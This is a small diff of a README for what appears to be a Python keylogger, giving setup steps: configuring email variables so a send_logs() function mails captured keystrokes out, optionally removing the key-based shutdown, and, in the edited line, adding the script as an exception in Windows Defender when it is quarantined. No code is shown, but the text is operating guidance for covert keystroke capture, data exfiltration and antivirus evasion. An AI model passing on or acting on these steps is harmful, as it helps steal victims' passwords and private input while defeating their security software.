@@ -7,7 +7,7 @@
     - Change the TO:/FROM: email vars to your own email. (Must be setup with google API) # Current WIP
     - Run send_logs() function >> __name__ == '__main__'  (Above the Listener) # Current WIP
     - OPTIONAL: Remove/modify the if statement under on_press() function that shuts down K3yL0G.py with 'HOME' key.
-# Don't forget to add this as an exception when Windows try's to quarantine it..
+# Don't forget to add 'KL0gG3r.py' as an exception to Win. Defender when Windows tries to quarantine it..
 # Example Logs:
 
 ![image](https://user-images.githubusercontent.com/22335730/217734288-e9d91ea9-e3ed-486e-8ffd-b2b596a748a5.png)
